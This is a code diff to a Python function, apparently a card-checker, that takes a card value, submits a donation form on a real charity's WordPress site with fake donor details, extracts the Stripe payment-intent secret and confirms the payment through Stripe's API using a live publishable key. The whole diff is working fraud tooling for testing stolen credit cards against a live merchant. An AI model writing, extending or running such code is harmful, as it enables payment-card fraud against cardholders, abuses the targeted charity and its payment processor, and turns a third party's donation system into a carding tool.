@@ -16,7 +16,7 @@ def Tele(ccx):
 	
 	random_amount1 = random.randint(2, 9)
 	random_amount2 = random.randint(1, 99)
-	
+
 	headers = {
 	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
@@ -93,7 +93,7 @@ def Tele(ccx):
 	    'title': 'Mr',
 	    'first_name': 'Gen',
 	    'last_name': 'Paypal',
-	    'email': f'genpaypal{random_amount2}@gmail.com',
+	    'email': 'genpaypal02@gmail.com',
 	    'address': 'Street 27',
 	    'postcode': '10080',
 	    'where_did_you_hear_about_us': 'twitter',
@@ -105,8 +105,41 @@ def Tele(ccx):
 	response = requests.post('https://thefore.org/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
-		result = response.json()['errors']
-	except:
-		result = response.text
-		
-	return (result)
+		scrt = response.json().get('secret')
+		if not scrt:
+			return response.text
+		pi = re.search(r"(pi_[^_]+)", scrt)
+		pi = pi.group(1)
+	except Exception:
+		return response.text	
+	
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = {
+	    'expected_payment_method_type': 'card',
+	    'use_stripe_sdk': 'true',
+	    'key': 'pk_live_51GY9Z7BL0CS8rR8jHCclfYbWANbFqlfRgq7lgJ1hhwg4ehcM3eQqBIRWc7kkloxswKZ8VBSdoRthk0RshUlmJqsk00bWSSgZE6',
+	    'client_secret': f'{scrt}',
+	}
+	
+	response = requests.post(
+	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
+	    headers=headers,
+	    data=data,
+	)
+	
+	return response.text
